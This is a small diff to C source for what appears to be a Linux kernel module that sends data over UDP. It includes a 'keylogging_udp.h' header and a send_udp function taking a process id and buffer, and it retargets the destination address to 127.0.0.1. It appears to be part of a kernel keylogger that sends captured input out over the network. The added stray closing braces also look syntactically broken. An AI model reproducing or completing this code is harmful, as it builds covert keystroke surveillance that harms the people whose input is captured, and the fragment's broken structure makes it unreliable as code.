@@ -1,9 +1,13 @@
 #include <linux/net.h>
 #include <linux/in.h>
 #include <linux/socket.h>
+#include <asm/segment.h>
+#include <asm/uaccess.h>
+
+#include "keylogging_udp.h"
 
 #define MESSAGE_SIZE 1024
-#define INADDR_SEND ((unsigned long int)0x0a00020f) //10.0.2.15
+#define INADDR_SEND ((unsigned long int)0x7f000001) //127.0.0.1
 static struct socket *sock;
 static struct sockaddr_in sin;
 static struct msghdr msg;
@@ -37,9 +41,10 @@ if (sock_init){
   msg.msg_controllen = 0;
   msg.msg_iov = &iov;
   msg.msg_control = NULL;
-  sock_init = true;
+  sock_init = 1;
 }
-
+}
+}
 void send_udp(int pid, char * buf){
   if(sock_init){
 /* Sending a message */
